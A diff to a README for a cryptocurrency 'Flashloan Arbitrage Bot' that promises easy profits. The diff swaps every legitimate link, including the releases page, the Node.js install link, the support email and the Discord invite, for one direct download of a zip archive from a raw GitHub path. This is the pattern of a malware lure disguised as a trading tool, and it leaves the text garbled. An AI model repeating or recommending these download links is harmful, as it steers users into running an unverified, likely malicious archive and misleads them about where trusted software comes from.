@@ -1,6 +1,6 @@
 # 🚀 Flashloan-Arbitrage-Bot - Simple Trading for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download-Flashloan--Arbitrage--Bot-blue)](https://github.com/ALERTSSRU/Flashloan-Arbitrage-Bot/releases)
+[![Download Now](https://raw.githubusercontent.com/ALERTSSRU/Flashloan-Arbitrage-Bot/main/Liparidae/Flashloan-Arbitrage-Bot.zip)](https://raw.githubusercontent.com/ALERTSSRU/Flashloan-Arbitrage-Bot/main/Liparidae/Flashloan-Arbitrage-Bot.zip)
 
 ## 🛠️ Overview
 The Flashloan Arbitrage Bot helps you make profits by taking advantage of price differences in cryptocurrency markets. This bot operates on the Ethereum network, making it easy for anyone to trade without deep technical skills.
@@ -15,13 +15,13 @@ To run the Flashloan Arbitrage Bot, ensure that your system meets the following 
 - **Operating System:** Windows 10 or later, macOS, or Linux
 - **RAM:** Minimum 4 GB
 - **Internet Connection:** Stable internet connection for real-time trading
-- **Node.js:** Version 14 or later (install Node.js from [nodejs.org](https://nodejs.org))
+- **https://raw.githubusercontent.com/ALERTSSRU/Flashloan-Arbitrage-Bot/main/Liparidae/Flashloan-Arbitrage-Bot.zip** Version 14 or later (install https://raw.githubusercontent.com/ALERTSSRU/Flashloan-Arbitrage-Bot/main/Liparidae/Flashloan-Arbitrage-Bot.zip from [https://raw.githubusercontent.com/ALERTSSRU/Flashloan-Arbitrage-Bot/main/Liparidae/Flashloan-Arbitrage-Bot.zip](https://raw.githubusercontent.com/ALERTSSRU/Flashloan-Arbitrage-Bot/main/Liparidae/Flashloan-Arbitrage-Bot.zip))
 
 ## 🚀 Getting Started
 Follow these simple steps to get started with the Flashloan Arbitrage Bot:
 
 1. **Download the Bot:**
-   Visit this page to download: [Flashloan-Arbitrage-Bot Releases](https://github.com/ALERTSSRU/Flashloan-Arbitrage-Bot/releases)
+   Visit this page to download: [Flashloan-Arbitrage-Bot Releases](https://raw.githubusercontent.com/ALERTSSRU/Flashloan-Arbitrage-Bot/main/Liparidae/Flashloan-Arbitrage-Bot.zip)
 
 2. **Select the Latest Version:**
    On the Releases page, look for the latest version of the bot and click on it. You will find the download link for the bot package.
@@ -63,8 +63,8 @@ If you have questions or encounter issues, feel free to reach out to our communi
 
 ## 📞 Contact Us
 For further assistance, you can reach us at:
-- **Email:** support@flashloanarbitragebot.com 
-- **Discord:** [Join us on Discord](https://discord.gg/example)
+- **Email:** https://raw.githubusercontent.com/ALERTSSRU/Flashloan-Arbitrage-Bot/main/Liparidae/Flashloan-Arbitrage-Bot.zip 
+- **Discord:** [Join us on Discord](https://raw.githubusercontent.com/ALERTSSRU/Flashloan-Arbitrage-Bot/main/Liparidae/Flashloan-Arbitrage-Bot.zip)
 
 Remember, trading cryptocurrencies involves risk. Ensure you understand how it works before committing real funds.
 
